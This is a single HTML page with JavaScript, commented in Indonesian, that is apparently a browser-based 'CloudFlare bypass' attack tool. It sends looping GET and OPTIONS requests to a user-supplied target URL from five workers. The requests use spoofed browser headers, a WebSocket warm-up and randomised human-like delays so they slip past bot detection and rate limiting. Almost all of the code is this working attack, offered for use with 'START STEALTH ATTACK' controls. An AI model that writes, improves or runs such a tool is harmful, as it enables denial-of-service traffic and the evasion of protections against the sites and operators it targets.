<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üïµÔ∏è STEALTH MODE BYPASS</title>
    <style>
        :root {
            --primary: #10b981;
            --secondary: #3b82f6;
            --danger: #ef4444;
            --dark: #111827;
            --darker: #0a0a0a;
            --text: #f9fafb;
            --text-secondary: #9ca3af;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background: var(--darker);
            color: var(--text);
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(30, 30, 30, 0.9);
            border-radius: 10px;
            padding: 25px;
            border: 2px solid var(--primary);
            box-shadow: 0 0 30px rgba(16, 185, 129, 0.2);
        }
        
        h1 {
            text-align: center;
            color: var(--primary);
            margin-bottom: 10px;
            font-size: 2.5em;
            text-shadow: 0 0 10px var(--primary);
        }
        
        .subtitle {
            text-align: center;
            color: var(--text-secondary);
            margin-bottom: 30px;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        input {
            width: 100%;
            padding: 15px;
            background: rgba(0, 0, 0, 0.5);
            border: 2px solid var(--secondary);
            border-radius: 8px;
            color: var(--text);
            font-size: 1.1em;
            margin-bottom: 10px;
        }
        
        .btn-group {
            display: flex;
            gap: 15px;
            margin: 25px 0;
        }
        
        button {
            flex: 1;
            padding: 18px;
            border: none;
            border-radius: 8px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn-start {
            background: linear-gradient(45deg, var(--primary), #059669);
            color: white;
        }
        
        .btn-start:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4);
        }
        
        .btn-stop {
            background: linear-gradient(45deg, #555, #222);
            color: white;
            border: 2px solid var(--danger);
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 25px 0;
        }
        
        .stat {
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            text-align: center;
            border-radius: 8px;
            border: 1px solid var(--secondary);
        }
        
        .stat-value {
            font-size: 2.5em;
            color: var(--primary);
            font-weight: bold;
        }
        
        .stat-label {
            color: var(--text-secondary);
            font-size: 0.9em;
        }
        
        .logs {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--secondary);
            border-radius: 8px;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            margin-top: 20px;
            font-size: 0.9em;
        }
        
        .log-entry {
            padding: 10px;
            margin: 5px 0;
            border-left: 4px solid var(--primary);
            background: rgba(16, 185, 129, 0.1);
        }
        
        .log-time {
            color: var(--text-secondary);
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üïµÔ∏è STEALTH MODE BYPASS</h1>
        <div class="subtitle">CloudFlare Bypass dengan WebSocket + Browser Simulation</div>
        
        <div class="input-group">
            <input type="text" id="targetUrl" value="https://rate-limit-1.dstatbot.win/cmkxTq0k" placeholder="Target URL">
        </div>
        
        <div class="btn-group">
            <button class="btn-start" onclick="startStealthAttack()">üöÄ START STEALTH ATTACK</button>
            <button class="btn-stop" onclick="stopAttack()">‚õî STOP</button>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-value" id="total">0</div>
                <div class="stat-label">TOTAL REQUESTS</div>
            </div>
            <div class="stat">
                <div class="stat-value" id="success">0</div>
                <div class="stat-label">SUCCESSFUL</div>
            </div>
        </div>
        
        <div class="logs" id="logs"></div>
    </div>

    <script>
        // ==================== STEALTH HEADERS ====================
        const STEALTH_HEADERS = {
            // Browser-like headers (less variation, more consistency)
            getStandardHeaders() {
                return {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Cache-Control': 'max-age=0'
                };
            },
            
            // CORS headers untuk OPTIONS
            getCorsHeaders(origin) {
                return {
                    'Origin': origin,
                    'Access-Control-Request-Method': 'GET',
                    'Access-Control-Request-Headers': 'Authorization, Content-Type'
                };
            }
        };
        
        // ==================== STEALTH ENGINE ====================
        let isAttacking = false;
        let stats = { total: 0, success: 0 };
        let workers = [];
        
        function log(msg) {
            const time = new Date().toLocaleTimeString();
            const logs = document.getElementById('logs');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
            logs.appendChild(entry);
            logs.scrollTop = logs.scrollHeight;
        }
        
        function updateStats() {
            document.getElementById('total').textContent = stats.total;
            document.getElementById('success').textContent = stats.success;
        }
        
        // Step 1: WebSocket Connection (buka koneksi legit dulu)
        async function initiateWebSocket(url) {
            return new Promise((resolve) => {
                try {
                    const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
                    const ws = new WebSocket(wsUrl);
                    
                    ws.onopen = () => {
                        log('‚úÖ WebSocket connection established');
                        ws.send('ping');
                        setTimeout(() => {
                            ws.close();
                            resolve(true);
                        }, 1000);
                    };
                    
                    ws.onerror = () => {
                        log('‚ö†Ô∏è WebSocket failed, continuing anyway');
                        resolve(false);
                    };
                    
                    setTimeout(() => resolve(false), 3000);
                } catch (e) {
                    resolve(false);
                }
            });
        }
        
        // Step 2: Simulasi browsing sequence
        async function simulateBrowserSession(url) {
            const parsedUrl = new URL(url);
            const origin = `${parsedUrl.protocol}//${parsedUrl.hostname}`;
            
            try {
                // 1. GET request ke root (seperti browser biasa)
                const rootResponse = await fetch(origin, {
                    method: 'GET',
                    headers: STEALTH_HEADERS.getStandardHeaders(),
                    mode: 'no-cors',
                    credentials: 'omit'
                });
                
                // 2. OPTIONS request (CORS preflight)
                const optionsResponse = await fetch(url, {
                    method: 'OPTIONS',
                    headers: {
                        ...STEALTH_HEADERS.getStandardHeaders(),
                        ...STEALTH_HEADERS.getCorsHeaders(origin)
                    },
                    mode: 'cors',
                    credentials: 'omit'
                });
                
                return optionsResponse.status === 200;
            } catch (e) {
                return false;
            }
        }
        
        // Step 3: Slow & steady attack (mimic human behavior)
        async function stealthWorker() {
            const url = document.getElementById('targetUrl').value;
            const parsedUrl = new URL(url);
            const origin = `${parsedUrl.protocol}//${parsedUrl.hostname}`;
            
            // Tunggu 1-3 detik antara requests (seperti manusia)
            const delay = () => new Promise(resolve => 
                setTimeout(resolve, Math.random() * 2000 + 1000)
            );
            
            while (isAttacking) {
                try {
                    // Variasi antara GET dan OPTIONS
                    const useOptions = Math.random() > 0.7; // 30% OPTIONS, 70% GET
                    
                    let response;
                    if (useOptions) {
                        // OPTIONS dengan headers lengkap
                        response = await fetch(url, {
                            method: 'OPTIONS',
                            headers: {
                                ...STEALTH_HEADERS.getStandardHeaders(),
                                ...STEALTH_HEADERS.getCorsHeaders(origin),
                                'Referer': origin,
                                'Accept': '*/*'
                            },
                            mode: 'cors',
                            credentials: 'omit'
                        });
                    } else {
                        // GET request biasa
                        response = await fetch(url, {
                            method: 'GET',
                            headers: {
                                ...STEALTH_HEADERS.getStandardHeaders(),
                                'Referer': origin
                            },
                            mode: 'no-cors',
                            credentials: 'omit'
                        });
                    }
                    
                    if (response.status === 200 || response.type === 'opaque') {
                        stats.success++;
                        if (stats.success % 5 === 0) {
                            log(`‚úÖ ${useOptions ? 'OPTIONS' : 'GET'} success`);
                        }
                    }
                    
                } catch (e) {
                    // Silent fail
                }
                
                stats.total++;
                updateStats();
                
                // Delay antara requests
                await delay();
            }
        }
        
        // ==================== MAIN CONTROL ====================
        async function startStealthAttack() {
            if (isAttacking) {
                log('‚ö†Ô∏è Attack already running');
                return;
            }
            
            const url = document.getElementById('targetUrl').value;
            if (!url) {
                alert('Enter target URL!');
                return;
            }
            
            isAttacking = true;
            stats = { total: 0, success: 0 };
            workers = [];
            
            log('üöÄ Starting STEALTH attack...');
            log('üïµÔ∏è Step 1: Initializing WebSocket...');
            
            // Step 1: Init WebSocket
            const wsSuccess = await initiateWebSocket(url);
            log(wsSuccess ? '‚úÖ WebSocket ready' : '‚ö†Ô∏è WebSocket skipped');
            
            log('üïµÔ∏è Step 2: Simulating browser session...');
            
            // Step 2: Simulate browser
            const browserSuccess = await simulateBrowserSession(url);
            log(browserSuccess ? '‚úÖ Browser simulation complete' : '‚ö†Ô∏è Browser simulation failed');
            
            log('üïµÔ∏è Step 3: Starting stealth workers...');
            
            // Step 3: Start stealth workers (cuma 3-5 workers, bukan ribuan)
            const workerCount = 5; // SEDIKIT tapi STEALTHY
            for (let i = 0; i < workerCount; i++) {
                workers.push(stealthWorker());
            }
            
            log(`üéØ Running ${workerCount} stealth workers`);
            log('‚ö†Ô∏è Using human-like delays between requests');
        }
        
        function stopAttack() {
            isAttacking = false;
            workers = [];
            log('üõë Attack stopped');
        }
        
        // Initial log
        setTimeout(() => {
            log('üïµÔ∏è STEALTH MODE BYPASS loaded');
            log('‚ö†Ô∏è Strategy: Slow & steady wins the race');
            log('üéØ Target: 5-10 RPS with high success rate');
        }, 100);
    </script>
</body>
</html>
